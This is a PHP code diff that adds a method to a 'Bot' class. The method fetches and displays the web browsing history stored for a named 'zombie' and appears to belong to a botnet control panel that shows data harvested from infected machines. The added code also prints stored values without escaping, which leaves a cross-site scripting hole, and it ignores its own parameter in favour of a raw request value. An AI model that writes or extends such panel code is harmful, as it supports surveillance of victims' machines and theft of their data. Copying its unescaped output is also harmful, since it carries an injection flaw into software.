@@ -33,6 +33,31 @@ class Bot
         }
     }
     
+    static function GetLastHistorique($bot_id = NULL){
+        if($bot_id != NULL){
+            global $bdd;
+            $select_name = $bdd->prepare("SELECT name FROM bots WHERE id = :id");
+            $select_name->bindParam(':id', $_GET['id']);
+            $select_name->execute();
+            $result = $select_name->fetch();
+            $select_historique = $bdd->prepare("SELECT * FROM history_web WHERE zombie = :zname");
+            $select_historique->bindParam(':zname', $result['name']);
+            $select_historique->execute();
+            if($select_historique->rowCount() > 0){
+                while($result = $select_historique->fetch()){
+                    ?>
+                    <div class="ui relaxed divided list">
+                      <div class="item">
+                        <div class="content">
+                          <div class="description"><?php echo $result['website']; ?></div>
+                        </div>
+                      </div>
+                    </div>
+                    <?php
+                }
+            }
+        }
+    }
     
     public function getSetting($bot_id = NULL, $setting_name = NULL){
         global $bdd;
